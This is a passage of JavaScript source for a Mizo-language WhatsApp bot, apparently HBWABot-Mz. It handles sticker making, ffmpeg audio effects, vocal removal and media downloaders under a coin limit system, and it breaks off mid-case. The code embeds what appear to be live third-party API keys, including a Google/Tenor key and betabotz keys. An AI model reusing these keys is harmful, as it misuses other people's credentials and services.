HBWABotMz.sendMessage(from, { react: { text: "🧩" , key: m.key }})
const texttoimg = `https://www6.flamingtext.com/net-fu/proxy_form.cgi?&imageoutput=true&script=fluffy-logo&doScale=true&scaleWidth=800&scaleHeight=500&fontsize=100&text=${encodeURIComponent(q)}`;
await HBWABotMz.sendImageAsSticker(m.chat, texttoimg, m, { packname: global.packname, author: `HBWABot` })
await eco.deduct(limitneihtu, kancoins, hmanzat)
await eco.give(limitneihtu, kantitle, hmanzat2);} catch (error) {
dodoi("*Sorry, hawrawp 30 aia tam chu ka siam sak thei lo che a ni😞*")
}
}
break

case 'ttp2': {

try {
if (!q) return dodoi2(`${mtl2.guide1}\n*⟨Entirnan :* ${prefix + command} Hello World`) 
const limit1= await eco.balance(limitneihtu, kancoins)
if (hmanzat > limit1.wallet) return await dailylimit()
HBWABotMz.sendMessage(from, { react: { text: "🧩" , key: m.key }})
const texttoimg = `https://www6.flamingtext.com/net-fu/proxy_form.cgi?&imageoutput=true&script=runner-logo&doScale=true&scaleWidth=800&scaleHeight=500&fontsize=100&text=${encodeURIComponent(q)}`;
await HBWABotMz.sendImageAsSticker(m.chat, texttoimg, m, { packname: global.packname, author: `HBWABot` })
await eco.deduct(limitneihtu, kancoins, hmanzat)
await eco.give(limitneihtu, kantitle, hmanzat2);} catch (error) {
dodoi("*Sorry, hawrawp 30 aia tam chu ka siam sak thei lo che a ni😞*")
}
}
break

case 'ttp6': {

try {
if (!q) return dodoi2(`${mtl2.guide1}\n*⟨Entirnan :* ${prefix + command} Hello World`) 
const limit1= await eco.balance(limitneihtu, kancoins)
if (hmanzat > limit1.wallet) return await dailylimit()
HBWABotMz.sendMessage(from, { react: { text: "🧩" , key: m.key }})
const texttoimg = `https://www6.flamingtext.com/net-fu/proxy_form.cgi?&imageoutput=true&script=smurfs-logo&doScale=true&scaleWidth=800&scaleHeight=500&fontsize=100&text=${encodeURIComponent(q)}`;
await HBWABotMz.sendImageAsSticker(m.chat, texttoimg, m, { packname: global.packname, author: `HBWABot` })
await eco.deduct(limitneihtu, kancoins, hmanzat)
await eco.give(limitneihtu, kantitle, hmanzat2);} catch (error) {
dodoi("*Sorry, hawrawp 30 aia tam chu ka siam sak thei lo che a ni😞*")
}
}
break
case 'ttp': {
if (!q) return dodoi2(`${mtl2.guide1}\n*⟨Entirnan :* ${prefix + command} Hello World`) 
const limit1= await eco.balance(limitneihtu, kancoins)
if (hmanzat > limit1.wallet) return await dailylimit()
HBWABotMz.sendMessage(from, { react: { text: "🧩" , key: m.key }})
const chutin1 = `https://api.tioo.eu.org/ttp?text=${encodeURIComponent(q)}`
await HBWABotMz.sendImageAsSticker(m.chat, chutin1, m, { packname: global.packname, author: `HBWABot` })
await eco.deduct(limitneihtu, kancoins, hmanzat)
await eco.give(limitneihtu, kantitle, hmanzat2);}
break

case 'text2pic': {
  if (!q) return dodoi2(`${mtl2.guide1}\n*⟨Entirnan :* ${prefix + command} A girl singing in public`);
  
  const limit1 = await eco.balance(limitneihtu, kancoins);
  if (hmanzat > limit1.wallet) return await dailylimit();

  HBWABotMz.sendMessage(from, { react: { text: "🧩", key: m.key } });

  const source = 'lus';
  const target = 'en';
  const athu = `${text
    .replace(/Zawhte|zawhte|zohte/g, 'cat')
    .replace(/Vawk|vawk/g, 'pig')}`;

  const mizotranslation = await mizo_tawnga_translate_na.translate(source, target, athu);

  // Call the gptpic scrapper
  const { gptpic } = require('./lib/gptpic');
  const fakeReq = {
    method: "POST",
    body: {
      prompt: mizotranslation,
      captionModel: "default"
    }
  };

  let jsonResponse = {};
  const fakeRes = {
    status: code => ({
      json: json => (jsonResponse = json)
    })
  };

  await gptpic(fakeReq, fakeRes);

  if (jsonResponse?.url) {
    HBWABotMz.sendMessage(m.chat, { image: { url: jsonResponse.url }, caption: `*${text}*` }, { quoted: m });
    await eco.deduct(limitneihtu, kancoins, hmanzat);
    await eco.give(limitneihtu, kantitle, hmanzat2);
  } else {
    return dodoi2("_❌ Failed to generate image._");
  }
}
break;


case 'toanime': {
    const freevip = "frvip2";
    const limit24 = await eco.balance(limitneihtu, freevip);
/*    if (!isVip && limit24.wallet < 1) {
        return await replyvip();
    }
    if (isExp && limit24.wallet < 1) {
        return replyvipexp();
    } */
if (!quoted) return dodoi(`Thlalak rawn dah rawh`)
if (!/image/.test(mime)) return dodoi(`Thlalak Send/Reply in a caption ah ${prefix + command} tih hi rawn dah rawh`)
const limit1= await eco.balance(limitneihtu, kancoins)
if (hmanzat > limit1.wallet) return await dailylimit()
await loadingreact()
let media = await HBWABotMz.downloadAndSaveMediaMessage(quoted)
let anu = await tourlup(media);
const chutin1 = `https://api.betabotz.eu.org/api/maker/jadighibili?url=${anu}&apikey=Btz-HlFgj`
HBWABotMz.sendMessage(m.chat, { image: { url: `${chutin1}` }, caption: `*Generated by ${botname}*` }, { quoted: m });
await eco.deduct(limitneihtu, kancoins, hmanzat);
    await eco.give(limitneihtu, kantitle, hmanzat2);
    await eco.deduct(limitneihtu, freevip, 1);
    await finishreact();
    }
break


/*
case 'ttp': {

    if (!q) return dodoi2(`${mtl2.guide1}\n*⟨Entirnan :* ${prefix + command} Hello World`) 
    const limit1= await eco.balance(limitneihtu, kancoins)
    if (hmanzat > limit1.wallet) return await dailylimit()
    Canvas.registerFont('./asset/image/SF-Pro.ttf', { family: 'SF-Pro' })
    let length = text.length
        
    var font = 90
    if (length>12){ font = 68}
    if (length>15){ font = 58}
    if (length>18){ font = 55}
    if (length>19){ font = 50}
    if (length>22){ font = 48}
    if (length>24){ font = 38}
    if (length>27){ font = 35}
    if (length>30){ font = 30}
    if (length>35){ font = 26}
    if (length>39){ font = 25}
    if (length>40){ font = 20}
    if (length>49){ font = 10}

    var ttp = {}
    ttp.create = Canvas.createCanvas(576, 576)
    ttp.context = ttp.create.getContext('2d')
    ttp.context.font = `${font}px SF-Pro`
    ttp.context.strokeStyle = 'black'
    ttp.context.lineWidth = 3
    ttp.context.textAlign = 'center'
    ttp.context.strokeText(text, 290, 300)
    ttp.context.fillStyle = 'white'
    ttp.context.fillText(text, 290, 300)
    
    var bufferx = ttp.create.toBuffer()    
    await HBWABotMz.sendImageAsSticker(m.chat, bufferx, m, { packname: global.packname, author: `HBWABot` })
    await eco.deduct(limitneihtu, kancoins, hmanzat)
await eco.give(limitneihtu, kantitle, hmanzat2);}
break;
*/
case 'attp':{
if (!q) return dodoi2(`${mtl2.guide1}\n*⟨Entirnan :* ${prefix + command} Hello World`)
HBWABotMz.sendMessage(from, { react: { text: "🧩" , key: m.key }})
const limit1= await eco.balance(limitneihtu, kancoins)
if (hmanzat > limit1.wallet) return await dailylimit()
const nunui2 = `https://api.betabotz.eu.org/api/maker/attp?text=${encodeURIComponent(q)}&apikey=Btz-HlFgj`
await HBWABotMz.sendVideoAsSticker(m.chat, nunui2, m, { packname: global.packname, author: global.author })
await eco.deduct(limitneihtu, kancoins, hmanzat)
await eco.give(limitneihtu, kantitle, hmanzat2);}
break
/*
case 'attp': {

        if (!text) {
            return dodoi(`${mtl2.guide1}\n\n*⟨Entirnan :* ${prefix + command} Hello World`)
        }
        const limit1= await eco.balance(limitneihtu, kancoins)
if (hmanzat > limit1.wallet) return await dailylimit()

        const file = "./asset/image/attp.gif"
        let length = text.length
        let font = 90

        if (length > 12) { font = 68 }
        if (length > 15) { font = 58 }
        if (length > 18) { font = 55 }
        if (length > 19) { font = 50 }
        if (length > 22) { font = 48 }
        if (length > 24) { font = 38 }
        if (length > 27) { font = 35 }
        if (length > 30) { font = 30 }
        if (length > 35) { font = 26 }
        if (length > 39) { font = 25 }
        if (length > 40) { font = 20 }
        if (length > 49) { font = 10 }

        Canvas.registerFont('./asset/image/SF-Pro.ttf', { family: 'SF-Pro' })
        await canvasGif(
            file,
            (ctx) => {
                const couler = ["#ff0000", "#ffe100", "#33ff00", "#00ffcc", "#0033ff", "#9500ff", "#ff00ff"]
                const jadi = couler[Math.floor(Math.random() * couler.length)]

                function drawStroked(text, x, y) {
                    ctx.lineWidth = 5
                    ctx.font = `${font}px SF-Pro`
                    ctx.fillStyle = jadi
                    ctx.strokeStyle = 'black'
                    ctx.textAlign = 'center'
                    ctx.strokeText(text, x, y)
                    ctx.fillText(text, x, y)
                }

                drawStroked(text, 290, 300)
            },
            {
                coalesce: false,
                delay: 0,
                repeat: 0,
                algorithm: 'octree',
                optimiser: false,
                fps: 7,
                quality: 100,
            }
        ).then((buffer) => {
            // Send the generated GIF as a sticker
            HBWABotMz.sendImageAsSticker(m.chat, buffer, m, {
                packname: packname,
                author: author,
            })
        })
        await eco.deduct(limitneihtu, kancoins, hmanzat)
await eco.give(limitneihtu, kantitle, hmanzat2);    }
    break;
  case 'j': {

  if (!text) return dodoi2(`${mtl2.guide1}\n*⟨Entirnan :* ${prefix + command} Hello World`);
  const thlakzuk = `${text.replace(/\n/g, '\\n')}`;
  const lines = thlakzuk.split('\n');
  const numberedLines = lines.slice(1).map((line, index) => `${String.fromCharCode(96 + index + 1)}). ${line}`).join('\n');
  const output = `${lines[0]}\\n${numberedLines}`;
  await dodoi(`${output}`);
}
break;
*/
 case 'bible-quotes': case 'bq':
const bible = await fetchJson('https://raw.githubusercontent.com/HBMods-OFC/Vawk/master/HBWABot-Mz/BibleQuote.json')
const mizo_bible = bible[Math.floor(Math.random() * bible.length)]
const thuziak = `${mizo_bible}`
return replymizobiblequotes(thuziak) 
break
case 'thuril': {

let mizoquotes = await fetchJson('https://raw.githubusercontent.com/HBMods-OFC/Vawk/master/HBWABot-Mz/mizoquotes.json')
let random = mizoquotes[Math.floor(Math.random() * mizoquotes.length)]
HBWABotMz.sendMessage(m.chat, { image: { url: random.quotesmizo }, caption: `${random.number}\n*Author* : ${random.author}\n\n*Instagram* : ${random.instagram}\n\n*Generated by: ©${random.hbwabot}*` }, { quoted: m })
}
break 
case 'couplepp': case 'ppcouple': {

await loadingreact()
const limit1= await eco.balance(limitneihtu, kancoins)
if (hmanzat > limit1.wallet) return await dailylimit()
let anucpp = await fetchJson('https://raw.githubusercontent.com/HBMods-OFC/Vawk/master/HBWABot-Mz/Inkawp.json')
let random = anucpp[Math.floor(Math.random() * anucpp.length)]
HBWABotMz.sendMessage(m.chat, { image: { url: random.male }, caption: `Mipa` }, { quoted: m })
HBWABotMz.sendMessage(m.chat, { image: { url: random.female }, caption: `Hmeichhia` }, { quoted: m })
await eco.deduct(limitneihtu, kancoins, hmanzat)
await eco.give(limitneihtu, kantitle, hmanzat2);await finishreact()
}
break
case 'description' : case 'gpdesc': case 'desc': {

if (!m.isGroup) return dodoi(mess.group)
if (!isBotAdmins) return dodoi(mess.botAdmin)
let metadata = await HBWABotMz.groupMetadata(m.chat)
HBWABotMz.sendMessage(from, { text : `*${metadata.subject}*\n\n*Group Description :*\n${metadata.desc}`},{ quoted: m})
}
break
case 'emojimix': {

let [emoji1, emoji2] = text.split`+`
if (!emoji1) return dodoi2(`${mtl2.guide1}\n*⟨Entirnan :* ${prefix + command} 😅+🤔`)
if (!emoji2) return dodoi2(`${mtl2.guide1}\n*⟨Entirnan :* ${prefix + command} 😅+🤔`)
const freevip = "frvip2";
    const limit24 = await eco.balance(limitneihtu, freevip);
/*    if (!isVip && limit24.wallet < 1) {
        return await replyvip();
    }
    if (isExp && limit24.wallet < 1) {
        return replyvipexp();
    } */
const limit1= await eco.balance(limitneihtu, kancoins)
if (hmanzat > limit1.wallet) return await dailylimit()
let anumojimix = await fetchJson(`https://tenor.googleapis.com/v2/featured?key=AIzaSyAyimkuYQYF_FXVALexPuGQctUWRURdCYQ&contentfilter=high&media_filter=png_transparent&component=proactive&collection=emoji_kitchen_v5&q=${encodeURIComponent(emoji1)}_${encodeURIComponent(emoji2)}`)
for (let res of anumojimix.results) {
let encmedia = await HBWABotMz.sendImageAsSticker(m.chat, res.url, m, { packname: global.packname, author: global.author, categories: res.tags })
}
await eco.deduct(limitneihtu, kancoins, hmanzat)
await eco.give(limitneihtu, kantitle, hmanzat2);}
break
case 'animeavatar': {

 waifudd = await axios.get(`https://nekos.life/api/v2/img/avatar`) 
 const limit1= await eco.balance(limitneihtu, kancoins)
if (hmanzat > limit1.wallet) return await dailylimit()
await HBWABotMz.sendMessage(m.chat, {image: {url:waifudd.data.url}, caption: `\n*©${global.botname}*`},{ quoted:m })
await eco.deduct(limitneihtu, kancoins, hmanzat).catch(err => {
return('Error!')
})
}
break
 case 'tinyurl':{
 if(!q) return dodoi2(`${mtl2.guide1}\nEntirnan: ${prefix}${command} https://www.youtube.com/@HBMods_Channel`)
 const freevip = "frvip2";
    const limit24 = await eco.balance(limitneihtu, freevip);
/*    if (!isVip && limit24.wallet < 1) {
        return await replyvip();
    }
    if (isExp && limit24.wallet < 1) {
        return replyvipexp();
    } */
 const limit1= await eco.balance(limitneihtu, kancoins)
if (hmanzat > limit1.wallet) return await dailylimit()
 const request = require('request')
 await eco.deduct(limitneihtu, kancoins, hmanzat)
await eco.give(limitneihtu, kantitle, hmanzat2); request(`https://tinyurl.com/api-create.php?url=${q}`, function (error, response, body) {
 try {
dodoi(body)
}
catch (e) {
dodoi(e)
}
})
}
 break
case 'git': case 'gitclone':{
if (!args[0]) return dodoi2(`${mtl2.guide1}\n*⟨Entirnan :* ${prefix}${command} https://github.com/HBMods-OFC/HBWABot-Mz`)
const limit1= await eco.balance(limitneihtu, kancoins)
if (hmanzat > limit1.wallet) return await dailylimit()
if (!isUrl(args[0]) && !args[0].includes('github.com')) return dodoi(`link a dik lo!!`)
let regex1 = /(?:https|git)(?::\/\/|@)github\.com[\/:]([^\/:]+)\/(.+)/i
let [, user, repo] = args[0].match(regex1) || []
repo = repo.replace(/.git$/, '')
let url = `https://api.github.com/repos/${user}/${repo}/zipball`
let filename = (await fetch(url, {method: 'HEAD'})).headers.get('content-disposition').match(/attachment; filename=(.*)/)[1]
await eco.deduct(limitneihtu, kancoins, hmanzat)
await eco.give(limitneihtu, kantitle, hmanzat2);HBWABotMz.sendMessage(m.chat, { document: { url: url }, fileName: filename, mimetype: 'application/zip' }, { quoted: m }).catch((err) => dodoi(mess.error))
}
break
case 'bass': case 'blown': case 'deep': case 'earrape': case 'fast': case 'fat': case 'nightcore': case 'reverse': case 'robot': case 'slow': case 'smooth': case 'squirrel': case 'karaoke': case 'echo': case '8d': case 'underwater': case 'reverb': case 'vaporwave': {
const limit1 = await eco.balance(limitneihtu, kancoins)
if (hmanzat > limit1.wallet) return await dailylimit()
try {
let set
if (/bass/.test(command)) set = '-af equalizer=f=54:width_type=o:width=2:g=20'
if (/blown/.test(command)) set = '-af acrusher=.1:1:64:0:log'
if (/deep/.test(command)) set = '-af atempo=4/4,asetrate=44500*2/3'
if (/earrape/.test(command)) set = '-af volume=12'
if (/fast/.test(command)) set = '-filter:a "atempo=1.63,asetrate=44100"'
if (/fat/.test(command)) set = '-filter:a "atempo=1.6,asetrate=22100"'
if (/nightcore/.test(command)) set = '-filter:a atempo=1.06,asetrate=44100*1.25'
if (/reverse/.test(command)) set = '-filter_complex "areverse"'
if (/robot/.test(command)) set = '-filter_complex "afftfilt=real=\'hypot(re,im)*sin(0)\':imag=\'hypot(re,im)*cos(0)\':win_size=512:overlap=0.75"'
if (/slow/.test(command)) set = '-filter:a "atempo=0.7,asetrate=44100"'
if (/smooth/.test(command)) set = '-filter:v "minterpolate=\'mi_mode=mci:mc_mode=aobmc:vsbmc=1:fps=120\'"'
if (/squirrel/.test(command)) set = '-filter:a "atempo=0.5,asetrate=65100"'
if (/karaoke/.test(command)) set = '-af "stereotools=mlev=0.03"'
if (/echo/.test(command)) set = '-af "aecho=0.8:0.88:60:0.4"'
if (/8d/.test(command)) set = '-af apulsator=hz=0.125'
if (/underwater/.test(command)) set = '-af "aformat=channel_layouts=stereo,asetrate=44100,aresample=44100,lowpass=f=300,highpass=f=200"'
if (/reverb/.test(command)) set = '-af "aecho=0.8:0.9:1000:0.3"'
if (/vaporwave/.test(command)) set = '-filter:a "atempo=0.8,asetrate=44100"'

if (/audio/.test(mime)) {
    await loadingreact()
    let media = await HBWABotMz.downloadAndSaveMediaMessage(quoted)
    let ran = getRandom('.mp3')
    exec(`ffmpeg -i ${media} ${set} ${ran}`, (err, stderr, stdout) => {
        fs.unlinkSync(media)
        if (err) return dodoi(err)
        let buff = fs.readFileSync(ran)
        HBWABotMz.sendMessage(m.chat, { audio: buff, mimetype: 'audio/mpeg' }, { quoted: m })
        fs.unlinkSync(ran)
    }) 
    await eco.deduct(limitneihtu, kancoins, hmanzat) 
    await finishreact()
} else dodoi(`Audio rawn thawn la *${prefix + command}* tiang hian reply rawh`)
} catch (e) {
    dodoi(e)
}
}
break
/*
case 'tokaraoke': 
case 'voiceremove': {
    if (!/video/.test(mime) && !/audio/.test(mime)) {
        return dodoi(`Video emaw Audio rawn thawn la a caption-ah *${prefix + command}* rawn dah la ti chuan, voice note in ka rawn thawn ang che.... `);
    }
    if (!quoted) {
        return dodoi(`Video emaw Audio rawn thawn la a caption-ah *${prefix + command}* rawn dah la ti chuan, voice note in ka rawn thawn ang che.... `);
    }

    const limit1 = await eco.balance(limitneihtu, kancoins);
    if (hmanzat > limit1.wallet) {
        return await dailylimit();
    }

    await loadingreact();
    await dodoi("Minutes 1 vel min lo nghak rawh");

    let q = m.quoted ? m.quoted : m;
    let buffer = await q.download();
    let fileSizeLimit = 5 * 1024 * 1024; // 5MB limit

    if (buffer.length > fileSizeLimit) {
        return dodoi('5MB aia tam a thei lo');
    }

    let filePath = await uploader(buffer); // Upload media to get a file path
    if (!filePath) {
        return dodoi("File upload failed.");
    }

    try {
        let result = await xminus.convert(filePath, {
            separation_type: "vocals_music",
            format: "mp3",
            model: "mdx_v2_vocft",
            aggressiveness: 2
        });

        if (!result.status) {
            throw "Voice removal failed. Please try again later.";
        }

        let { instrumental } = result.result.download;
        let authKey = await xminus.getAuthKey();

        await HBWABotMz.sendMessage(m.chat, { 
            audio: { url: instrumental }, 
            mimetype: 'audio/mpeg' 
        }, { quoted: m });

        await eco.deduct(limitneihtu, kancoins, hmanzat);
        await finishreact();
    } catch (error) {
        console.error(error);
        dodoi("Voice removal failed. Please try again later.");
    }
}
break;
case 'tokaraoke': 
case 'voiceremove': {
    if (!/video/.test(mime) && !/audio/.test(mime)) {
        return dodoi(`Video emaw Audio rawn thawn la a caption-ah *${prefix + command}* rawn dah la ti chuan, voice note in ka rawn thawn ang che.... `);
    }
    if (!quoted) {
        return dodoi(`Video emaw Audio rawn thawn la a caption-ah *${prefix + command}* rawn dah la ti chuan, voice note in ka rawn thawn ang che.... `);
    }

    const limit1 = await eco.balance(limitneihtu, kancoins);
    if (hmanzat > limit1.wallet) {
        return await dailylimit();
    }

    await loadingreact();
    await dodoi("Minutes 1 vel min lo nghak rawh");

    let q = m.quoted ? m.quoted : m;
    let buffer = await q.download();
    let fileSizeLimit = 5 * 1024 * 1024; // 5MB limit

    if (buffer.length > fileSizeLimit) {
        return dodoi('5MB aia tam a thei lo');
    }

    // Ensure the folder exists
    let dir = 'asset/trash';
    if (!fs.existsSync(dir)) {
        fs.mkdirSync(dir, { recursive: true });
    }

    // Save file to asset/trash
    let filePath = `${dir}/${Date.now()}.mp3`;
    fs.writeFileSync(filePath, buffer);

    try {
        let result = await xminus.convert(filePath, {
            separation_type: "vocals_music", // Remove vocals
            format: "mp3",
            model: "mdx_v2_vocft",
            aggressiveness: 2
        });

        if (!result.status) {
            throw "Voice removal failed. Please try again later.";
        }

        let { instrumental } = result.result.download;
        let authKey = await xminus.getAuthKey();

        await HBWABotMz.sendMessage(m.chat, { 
            audio: { url: instrumental }, 
            mimetype: 'audio/mpeg' 
        }, { quoted: m });

        await eco.deduct(limitneihtu, kancoins, hmanzat);
        await finishreact();
    } catch (error) {
        console.error(error);
        dodoi("Voice removal failed. Please try again later.");
    } finally {
        // Cleanup the uploaded file
        fs.unlinkSync(filePath);
    }
}
break;

case 'takevocal': {
    if (!/video/.test(mime) && !/audio/.test(mime)) {
        return dodoi(`Video emaw Audio rawn thawn la a caption-ah *${prefix + command}* rawn dah la ti chuan, voice note in ka rawn thawn ang che.... `);
    }
    if (!quoted) {
        return dodoi(`Video emaw Audio rawn thawn la a caption-ah *${prefix + command}* rawn dah la ti chuan, voice note in ka rawn thawn ang che.... `);
    }

    const limit1 = await eco.balance(limitneihtu, kancoins);
    if (hmanzat > limit1.wallet) {
        return await dailylimit();
    }

    await loadingreact();
    await dodoi("Minutes 1 vel min lo nghak rawh");

    let q = m.quoted ? m.quoted : m;
    let buffer = await q.download();
    let fileSizeLimit = 5 * 1024 * 1024; // 5MB limit

    if (buffer.length > fileSizeLimit) {
        return dodoi('5MB aia tam a thei lo');
    }

    // Ensure the folder exists
    let dir = 'asset/trash';
    if (!fs.existsSync(dir)) {
        fs.mkdirSync(dir, { recursive: true });
    }

    // Save file to asset/trash
    let filePath = `${dir}/${Date.now()}.mp3`;
    fs.writeFileSync(filePath, buffer);

    try {
        let result = await xminus.convert(filePath, {
            separation_type: "vocals_music", // Extract vocals only
            format: "mp3",
            model: "mdx_v2_vocft",
            aggressiveness: 2
        });

        if (!result.status) {
            throw "Vocal extraction failed. Please try again later.";
        }

        let { vocal } = result.result.download;
        let authKey = await xminus.getAuthKey();

        await HBWABotMz.sendMessage(m.chat, { 
            audio: { url: vocal }, 
            mimetype: 'audio/mpeg' 
        }, { quoted: m });

        await eco.deduct(limitneihtu, kancoins, hmanzat);
        await finishreact();
    } catch (error) {
        console.error(error);
        dodoi("Vocal extraction failed. Please try again later.");
    } finally {
        // Cleanup the uploaded file
        fs.unlinkSync(filePath);
    }
}
break;
*/
case 'tokaraoke': 
case 'voiceremove': {

    if (!/video/.test(mime) && !/audio/.test(mime)) {
        return dodoi(`Video emaw Audio rawn thawn la a caption-ah *${prefix + command}* rawn dah la ti chuan, voice note in ka rawn thawn ang che.... `);
    }
    if (!quoted) {
        return dodoi(`Video emaw Audio rawn thawn la a caption-ah *${prefix + command}* rawn dah la ti chuan, voice note in ka rawn thawn ang che.... `);
    }

    const limit1 = await eco.balance(limitneihtu, kancoins);
    if (hmanzat > limit1.wallet) {
        return await dailylimit();
    }
    await loadingreact();
    await dodoi("Minutes 1 vel min lo nghak rawh");
    let q = m.quoted ? m.quoted : m;
    let buffer = await q.download();
    let fileSizeLimit = 5 * 1024 * 1024; // 5MB limit

    if (buffer.length > fileSizeLimit) {
        return dodoi('5MB aia tam a thei lo');
    }
    let mediaUrl = await uploader(buffer); // Upload media to get a URL
    let apiUrl = `https://api.betabotz.eu.org/api/tools/voiceremover?url=${mediaUrl}&apikey=YybHI6GZ`;
    try {
        let response = await fetch(apiUrl);
        let res = await response.json();
        if (res.result && res.result.instrumental_path) {
            await HBWABotMz.sendMessage(m.chat, { 
                audio: { url: res.result.instrumental_path }, 
                mimetype: 'audio/mpeg' 
            }, { quoted: m });

            await eco.deduct(limitneihtu, kancoins, hmanzat);
            await finishreact();
        } else {
            throw 'Voice removal failed. Please try again later.';
        }
    } catch (error) {
        console.error(error);
    }
}
break;
case 'tovocal': 
case 'noiseremove': {

    if (!/video/.test(mime) && !/audio/.test(mime)) {
        return dodoi(`Video emaw Audio rawn thawn la a caption-ah *${prefix + command}* rawn dah la ti chuan, voice note in ka rawn thawn ang che.... `);
    }
    if (!quoted) {
        return dodoi(`Video emaw Audio rawn thawn la a caption-ah *${prefix + command}* rawn dah la ti chuan, voice note in ka rawn thawn ang che.... `);
    }

    const limit1 = await eco.balance(limitneihtu, kancoins);
    if (hmanzat > limit1.wallet) {
        return await dailylimit();
    }
    await loadingreact();
    await dodoi("Minutes 1 vel min lo nghak rawh");
    let q = m.quoted ? m.quoted : m;
    let buffer = await q.download();
    let fileSizeLimit = 5 * 1024 * 1024; // 5MB limit

    if (buffer.length > fileSizeLimit) {
        return dodoi('5MB aia tam a thei lo');
    }
    let mediaUrl = await uploader(buffer); // Upload media to get a URL
    let apiUrl = `https://api.betabotz.eu.org/api/tools/voiceremover?url=${mediaUrl}&apikey=YybHI6GZ`;
    try {
        let response = await fetch(apiUrl);
        let res = await response.json();
        if (res.result && res.result.instrumental_path) {
            await HBWABotMz.sendMessage(m.chat, { 
                audio: { url: res.result.vocal_path }, 
                mimetype: 'audio/mpeg' 
            }, { quoted: m });

            await eco.deduct(limitneihtu, kancoins, hmanzat);
            await finishreact();
        } else {
            throw 'Voice removal failed. Please try again later.';
        }
    } catch (error) {
        console.error(error);
    }
}
break;
case 'runtime': {

let lowq = `*Bot hi ${runtime(process.uptime())} chhung a online tawh a*

*Vawiin hi ni ${nizat1}, ${thlazat2} thla a ni a*`
dodoi(lowq)
}
break
case 'wallpaper': {
if (!text) return dodoi('A title rawn dah rawh!..')
const limit1= await eco.balance(limitneihtu, kancoins)
if (hmanzat > limit1.wallet) return await dailylimit()
await loadingreact()
let { wallpaper } = require('./lib/scraper')
anuwallpep = await wallpaper(text)
result = anuwallpep[Math.floor(Math.random() * anuwallpep.length)]
HBWABotMz.sendMessage(m.chat, {caption: `㋛︎ Title : ${result.title}\n㋛︎ Category : ${result.type}\n㋛︎ Detail : ${result.source}\n㋛︎ Media Url : ${result.image[2] || result.image[1] || result.image[0]}`, image: { url: result.image[0] }} , { quoted: m })
await eco.deduct(limitneihtu, kancoins, hmanzat)
await finishreact()
}
break
/*
case 'taketrack': {
    if (!args[0]) {
        return dodoi2(`${mtl2.guide1}\n\n*⟨Usage:* ${prefix + command} <YouTube Link> <Option>\n\n*✍🏻 Options:*\n- 2Stems\n- 4Stems\n- 5Stems\n- NoDrums\n- NoBass`);
    }
const { musicara } = require('./lib/musicara');
    const url = args[0];
    const option = args[1] || 'spleeter:2stems';
    
    if (!musicara.isUrl(url) || !musicara.youtube(url)) {
        return dodoi("Invalid YouTube link! Please provide a valid one.");
    }

    if (!Object.keys(musicara.steamx).includes(option)) {
        return dodoi("Invalid option! Choose one from:\n- 2Stems\n- 4Stems\n- 5Stems\n- NoDrums\n- NoBass");
    }

    const limit1 = await eco.balance(limitneihtu, kancoins);
    if (hmanzat > limit1.wallet) {
        return await dailylimit(); 
    }

    await loadingreact();
    

    try {
        const response = await musicara.download(url, option);
        
        if (!response.status) {
            return dodoi(response.result.error || "Failed to process the request.");
        }

        const media = response.result;
        await uploadreact();

        await HBWABotMz.sendMessage(m.chat, {
            audio: { url: media.download.original },
            mimetype: 'audio/mpeg'
        }, { quoted: m });

        await eco.deduct(limitneihtu, kancoins, hmanzat);
        await eco.give(limitneihtu, kantitle, hmanzat2);

        await finishreact();
    } catch (error) {
        console.error("Error extracting track:", error);
        await dodoi("An error occurred while processing your request.");
    }
}
break;
*/
case 'igvid':
case 'igpic':
case 'igtv': 
case 'igstory':
case 'igreels': {
    if (!args[0]) {
        return dodoi2(`${mtl2.guide1}\n\n*⟨Example:* ${prefix + command} https://www.instagram.com/reel/Cv83HHYtC-Y/`);
    }
    const url = args[0];
    if (!url.includes("instagram.com")) {
        return dodoi("Instagram link dik tak chauh rawn dah rawh!");
    }
    const limit1 = await eco.balance(limitneihtu, kancoins);
    if (hmanzat > limit1.wallet) {
        return await dailylimit();
    }
    await loadingreact();
    const Instagram = require('./lib/instagram'); 
    try {
        const media = await Instagram(url);
        await uploadreact();
        if (media.url && media.metadata?.isVideo) {
            for (let vid of media.url) {
                await HBWABotMz.sendMessage(m.chat, {
                    video: { url: vid },
                    caption: `Instagram Video downloaded by ${global.botname}`
                }, { quoted: m });

                await eco.deduct(limitneihtu, kancoins, hmanzat);
                await eco.give(limitneihtu, kantitle, hmanzat2);
            }
        } else if (media.url && media.url.length > 0) {
            for (let img of media.url) {
                await HBWABotMz.sendMessage(m.chat, {
                    image: { url: img },
                    caption: `Instagram Image downloaded by ${global.botname}`
                }, { quoted: m });
                await eco.deduct(limitneihtu, kancoins, hmanzat);
                await eco.give(limitneihtu, kantitle, hmanzat2);
            }
        } else {
            await dodoi("Hei hi ka download thei lo, media an awm lo em?");
        }
        await finishreact();
    } catch (error) {
        console.error("Error downloading Instagram media:", error);
        await dodoi("Hei hi ka download thei lo, private in a dah emaw ka code ah error a awm a ni mai thei");
    }

    break;
}

case 'tiktokvid' : case 'ttvid':{
const freevip = "frvip2";
    const limit24 = await eco.balance(limitneihtu, freevip);
/*    if (!isVip && limit24.wallet < 1) {
        return await replyvip();
    }
    if (isExp && limit24.wallet < 1) {
        return replyvipexp();
    } */
if (!text) return dodoi2(`${mtl2.guide1}\n\n*⟨Entirnan :* ${prefix + command} https://www.tiktok.com/@omagadsus/video/7025456384175017243?is_from_webapp=1&sender_device=pc&web_id6982004129280116226`)
const limit1= await eco.balance(limitneihtu, kancoins)
if (hmanzat > limit1.wallet) return await dailylimit()
await loadingreact()
const { ttdl } = require('btch-downloader') 
const link = args[0] 
const data = await ttdl(link) 
console.log(data)
await uploadreact()
await HBWABotMz.sendMessage(m.chat,{
video: {url: data.video},
caption: "Tiktok Videos download by "+ `${global.botname}`
}, {quoted:m})
await eco.deduct(limitneihtu, kancoins, hmanzat)
await eco.give(limitneihtu, kantitle, hmanzat2);
await eco.deduct(limitneihtu, freevip, 1);
await finishreact()

}
break


case 'ptvid':
case 'pinterestvid': case 'pinimage': {
const freevip = "frvip2";
    const limit24 = await eco.balance(limitneihtu, freevip);
/*    if (!isVip && limit24.wallet < 1) {
        return await replyvip();
    }
    if (isExp && limit24.wallet < 1) {
        return replyvipexp();
    } */
  if (!args || !args[0]) return dodoi2(`${mtl2.guide1}\n*⟨Entirnan :* ${prefix + command} https://pin.it/1ew2IPn`)
  const limit1= await eco.balance(limitneihtu, kancoins)
if (hmanzat > limit1.wallet) return await dailylimit()
  await loadingreact()
  const kanfa = args[0];
if (!text.includes('pin')) return dodoi(`Pinterest link dik chauh rawn dah rawh!!`)
try {
